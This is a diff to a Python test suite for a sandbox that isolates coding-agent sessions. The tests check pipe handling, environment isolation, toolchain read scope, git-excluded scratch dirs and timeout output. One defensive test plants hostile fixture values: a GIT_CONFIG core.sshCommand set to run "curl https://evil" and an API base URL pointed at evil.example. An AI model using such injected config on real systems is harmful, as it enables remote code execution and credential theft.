@@ -843,18 +843,6 @@ def test_toolchain_under_home_is_executable(tmp_path: Path):
         shutil.rmtree(tool_root, ignore_errors=True)
 
 
-def test_toolchain_allowread_covers_version_prefix_and_ancestors(tmp_path: Path):
-    home = Path.home()
-    fake = home / ".factory-sandbox-tc-unit" / "v1" / "bin" / "python"
-    entries = _toolchain_allowread(home, [fake])
-    expected = {
-        home / ".factory-sandbox-tc-unit",
-        home / ".factory-sandbox-tc-unit" / "v1",
-        home / ".factory-sandbox-tc-unit" / "v1" / "bin",
-    }
-    assert expected == entries, f"got {entries}"
-
-
 def test_home_is_a_writable_scratch_inside_the_run(tmp_path: Path):
     """HOME points at <run>/.home, not the (now unreadable) real home: pip,
     npm, git and Claude Code all want a HOME they can read and write."""
@@ -1008,3 +996,160 @@ def test_warm_cache_refuses_tracked_file_collisions(tmp_path: Path):
             "fixture", _fixture_repo(tmp_path), factory_root=_factory_root(tmp_path),
             warm_cache=cache,
         )
+
+
+# --- review round 4: pipe pumping, ambient seats, toolchain scope, excludes ---
+
+
+def test_large_output_does_not_deadlock(tmp_path: Path):
+    """proc.wait() with PIPEd stdout deadlocks once the child writes past the
+    pipe buffer (~64KB): nothing drains the pipes while the leader runs. A
+    300KB write must finish fast, not eat the whole wall clock."""
+    run, _, _ = _make_run(tmp_path)
+    script = "import sys\nsys.stdout.write('x' * 300000)\nprint()"
+    started = time.monotonic()
+    proc = run_sandboxed(
+        [sys.executable, "-c", script], run.root, run.settings_path, timeout=20
+    )
+    elapsed = time.monotonic() - started
+    assert len(proc.stdout.strip()) == 300000, (
+        f"output truncated or lost: {len(proc.stdout)} bytes\n{proc.stderr[-300:]}"
+    )
+    assert elapsed < 10, (
+        f"took {elapsed:.1f}s for a sub-second command — pipe deadlock"
+    )
+
+
+def test_ambient_seat_and_git_config_names_do_not_cross(tmp_path: Path, monkeypatch):
+    """The orchestrator's own ANTHROPIC_* keys and any GIT_CONFIG_* must not
+    enter a session by ambient inheritance (a real Anthropic key reaching a
+    Z.ai seat; exec-capable git config riding in). Seat names are taken ONLY
+    from the explicit env=; GIT_CONFIG_* is not taken at all."""
+    run, _, _ = _make_run(tmp_path)
+    monkeypatch.setenv("ANTHROPIC_API_KEY", "ambient-real-key")
+    monkeypatch.setenv("ANTHROPIC_AUTH_TOKEN", "ambient-override-token")
+    monkeypatch.setenv("ANTHROPIC_BASE_URL", "https://evil.example")
+    monkeypatch.setenv("GIT_CONFIG_COUNT", "1")
+    monkeypatch.setenv("GIT_CONFIG_KEY_0", "core.sshCommand")
+    monkeypatch.setenv("GIT_CONFIG_VALUE_0", "sh -c 'curl https://evil'")
+    # ANTHROPIC_AUTH_TOKEN itself is asserted positively below: the explicit
+    # env= is its only source and must win over the ambient monkeypatched one.
+    names = [
+        "ANTHROPIC_API_KEY", "ANTHROPIC_BASE_URL",
+        "GIT_CONFIG_COUNT", "GIT_CONFIG_KEY_0", "GIT_CONFIG_VALUE_0",
+    ]
+    script = textwrap.dedent(
+        """
+        import os, sys
+        for name in sys.argv[1:]:
+            value = os.environ.get(name)
+            print(f"{name}={value if value is not None else 'absent'}", flush=True)
+        """
+    )
+    proc = run_sandboxed(
+        _child(script, names + ["PATH", "ANTHROPIC_AUTH_TOKEN"]),
+        run.root,
+        run.settings_path,
+        env={"ANTHROPIC_AUTH_TOKEN": "deliberate"},
+        timeout=60,
+    )
+    seen = dict(line.split("=", 1) for line in proc.stdout.splitlines())
+    for name in names:
+        assert seen[name] == "absent", (
+            f"ambient {name} crossed into the session\n{proc.stdout}{proc.stderr}"
+        )
+    assert seen["PATH"], "PATH must still be inherited"
+    assert seen["ANTHROPIC_AUTH_TOKEN"] == "deliberate", (
+        "the explicit env= is the only source for seat names, and it must "
+        "win over the ambient value"
+    )
+
+
+def test_toolchain_allowread_is_install_dir_only():
+    """Only the resolved install dir is re-allowed (plus the version prefix
+    when the binary sits in a bin/), never the ancestors: re-allowing the
+    chain re-opens ~/.local and ~/.local/share — uv's credential store,
+    cursor-agent, Copilot shims and friends live there."""
+    home = Path.home()
+    base = home / ".factory-sandbox-tc-r4"
+    claude = base / "share" / "claude" / "versions" / "X" / "claude"
+    assert _toolchain_allowread(home, [claude]) == {
+        base / "share" / "claude" / "versions" / "X"
+    }
+    python = base / "pyenv" / "versions" / "3.12" / "bin" / "python"
+    assert _toolchain_allowread(home, [python]) == {
+        base / "pyenv" / "versions" / "3.12" / "bin",
+        base / "pyenv" / "versions" / "3.12",  # the interpreter's lib/ lives here
+    }
+
+
+def test_toolchain_bin_dir_under_home_still_executes(tmp_path: Path):
+    """The narrowed toolchain reads must still let a binary under $HOME run:
+    the round-3 exec fix has to survive its own scope reduction."""
+    home = Path.home()
+    tool_root = home / ".factory-sandbox-toolchain-r4"
+    tool_bin = tool_root / "bin"
+    tool_bin.mkdir(parents=True, exist_ok=True)
+    try:
+        probe = tool_bin / "probe"
+        probe.write_text("#!/bin/sh\necho 'r4 toolchain ok'\n")
+        probe.chmod(0o755)
+        run, _, _ = _make_run(tmp_path)
+        settings = build_settings({}, run.root, model_endpoint=MODEL_ENDPOINT,
+                                  toolchain=[probe])
+        write_settings(settings, run.settings_path)
+        proc = run_sandboxed([str(probe)], run.root, run.settings_path, timeout=60)
+        assert "r4 toolchain ok" in proc.stdout, (
+            f"rc={proc.returncode}\n{proc.stdout}{proc.stderr}"
+        )
+    finally:
+        shutil.rmtree(tool_root, ignore_errors=True)
+
+
+def test_home_and_tmp_scratch_are_git_excluded(tmp_path: Path):
+    """<run>/.home and <run>/.tmp are scratch: pip/npm caches and Claude Code
+    session state land there, and none of it may show up as untracked (an
+    agent's `git add -A` would commit caches and transcripts into the PR)."""
+    run, _, _ = _make_run(tmp_path)
+    script = textwrap.dedent(
+        """
+        import os, pathlib
+        home = pathlib.Path(os.environ["HOME"])
+        (home / ".cache" / "pip").mkdir(parents=True, exist_ok=True)
+        (home / ".cache" / "pip" / "x").write_text("cache")
+        pathlib.Path(os.environ["TMPDIR"], "scratch").write_text("tmp")
+        print("written", flush=True)
+        """
+    )
+    proc = run_sandboxed(
+        _child(script, []), run.root, run.settings_path, timeout=60
+    )
+    assert "written" in proc.stdout, proc.stdout + proc.stderr
+    status = subprocess.run(
+        ["git", "-C", str(run.root), "status", "--porcelain"],
+        check=True, capture_output=True, text=True,
+    ).stdout
+    assert status == "", f"scratch files appear as untracked:\n{status}"
+
+
+def test_timeout_preserves_partial_output(tmp_path: Path):
+    """When a detached pipe-holder forces the pipes closed, whatever the
+    leader already wrote must survive — not be discarded."""
+    run, _, _ = _make_run(tmp_path)
+    script = textwrap.dedent(
+        """
+        import subprocess, sys, time
+        print("BEFORE-DETACH-MARKER", flush=True)
+        subprocess.Popen(
+            [sys.executable, "-c", "import time; time.sleep(60)"],
+            start_new_session=True,
+        )
+        time.sleep(60)
+        """
+    )
+    with pytest.raises(subprocess.TimeoutExpired) as excinfo:
+        run_sandboxed(_child(script, []), run.root, run.settings_path, timeout=3)
+    output = excinfo.value.output or ""
+    assert "BEFORE-DETACH-MARKER" in output, (
+        f"partial output discarded on force-close: {output!r}"
+    )
